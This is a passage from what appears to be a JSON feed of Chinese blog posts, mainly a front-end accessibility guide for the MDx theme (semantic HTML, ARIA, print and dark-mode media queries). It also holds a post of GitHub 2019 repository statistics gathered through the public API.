标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 